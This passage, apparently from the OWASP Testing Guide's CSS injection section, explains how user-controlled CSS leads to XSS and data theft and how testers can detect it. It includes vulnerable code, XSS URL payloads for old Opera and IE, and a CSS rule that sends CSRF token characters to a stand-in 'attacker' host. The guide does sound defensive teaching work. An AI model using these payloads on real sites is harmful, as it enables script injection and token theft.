The impact of such a  vulnerability may vary on the basis of the supplied CSS payload: it  could lead to Cross-Site Scripting in particular circumstances, to data  exfiltration in the sense of extracting sensitive data or to UI  modifications.  <br /><br /> <br /><br /><h2>How to Test</h2><br />Such a vulnerability occurs when the application allows to supply  user-generated CSS or it is possible to somehow interfere with the legit  stylesheets. Injecting code in the CSS context gives the attacker the  possibility to execute JavaScript in certain conditions as well as  extracting sensitive values through CSS selectors and functions able to  generate HTTP requests. Actually, giving the users the possibility to  customize their own personal pages by using custom CSS files results in a  considerable risk, and should be definitely avoided.  <br /><br /> The following JavaScript code shows a possible vulnerable script in  which the attacker is able to control the "location.hash" (source) which  reaches the "cssText" function (sink). This particular case may lead to  DOMXSS in older browser versions, such as Opera, Internet Explorer and  Firefox; for reference see DOM XSS Wiki, section "Style Sinks".  <br />&lt;a id="a1"&gt;Click me&lt;/a&gt; <br />&lt;script&gt; <br />  if (location.hash.slice(1)) { <br />    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1); <br />  } <br />&lt;/script&gt; <br /><br /> Specifically the attacker could target the victim by asking her to visit the following URLs:  <br /> <br />• www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12])<br />• www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)<br /><br /> The same vulnerability may appear in the case of classical reflected XSS  in which for instance the PHP code looks like the following:  <br />&lt;style&gt; <br />p { <br />  color: &lt;?php echo $_GET['color']; ?&gt;; <br />  text-align: center; <br />} <br />&lt;/style&gt; <br /><br /> Much more interesting attack scenarios involve the possibility to  extract data through the adoption of pure CSS rules. Such attacks can be  conducted through CSS selectors and leading for instance to grab  anti-CSRF tokens, as follows. In particular,  input[name=csrf_token][value=^a] represents an element with the  attribute "name" set "csrf_token" and whose attribute "value" starts  with "a". By detecting the length of the attribute "value", it is  possible to carry out a brute force attack against it and send its value  to the attacker's domain.  <br />&lt;style&gt; <br />input[name=csrf_token][value=^a] { <br />  background-image: url(http://attacker/log?a); <br />} <br />&lt;/style&gt; <br /><br /> Much more modern attacks involving a combination of SVG, CSS and HTML5  have been proven feasible, therefore we recommend to see the References  section for details.  <br /><br /> <br /><br /><h3>Black Box testing</h3><br />We are referring to client-side testing, therefore black box testing  is not usually performed since access to the source code is always  available as it needs to be sent to the client to be executed. However,  it may happen that the user is given a certain degree of freedom in  terms of possibilities to supply HTML code; in that case it is required  to test whether no CSS injections are possible: tags like "link" and  "style" should be disallowed, as well as attributes "style".  <br /><br /> <br /><br /><h3>Gray Box testing</h3><br /><strong>Testing for CSS Injection vulnerabilities:</strong><br /> Manual testing needs to be conducted and the JavaScript code analyzed in  order to understand whether the attackers can inject its own content in  CSS context. In particular we should be interested in how the website  returns CSS rules on the basis of the inputs. <br /><br /> The following is a basic example:  <br />&lt;a id="a1"&gt;Click me&lt;/a&gt; <br />&lt;b&gt;Hi&lt;/b&gt; <br />&lt;script&gt; <br />  $("a").click(function(){ <br />    $("b").attr("style","color: " + location.hash.slice(1)); <br />  }); <br />&lt;/script&gt; <br /><br /> The above code contains a source "location.hash" that is controlled by  the attacker that can inject directly in the attribute "style" of an  HTML element. As mentioned above, this may lead to different results on  the basis of the adopted browser and the supplied payload.  <br /><br /> It is recommended that testers use the jQuery function css(property,  value) in such circumstances as follows, since this would disallow any  damaging injections. In general, we recommend to use always a whitelist  of allowed characters any time the input is reflected in the CSS  context.  <br />&lt;a id="a1"&gt;Click me&lt;/a&gt; <br />&lt;b&gt;Hi&lt;/b&gt; <br />&lt;script&gt; <br />  $("a").click(function(){ <br />    $("b").css("color",location.hash.slice(1)); <br />  }); <br />&lt;/script&gt; <br /><br /> <br /><br /><h2>References</h2><br /><strong>OWASP Resources</strong> <br />•  <a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">DOM based XSS Prevention Cheat Sheet</a><br />•  DOMXSS Wiki - <a href="https://code.google.com/p/domxsswiki/wiki/CssText">https://code.google.com/p/domxsswiki/wiki/CssText</a> <br /><br /> <strong>Presentations</strong><br /> <br />•  DOM Xss Identification and Exploitation, Stefano Di Paola - <a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dominator/DOMXss_Identification_and_exploitation.pdf">http://dominator.googlecode.com/files/DOMXss_Identification_and_exploitation.pdf</a> <br />•  Got Your Nose!
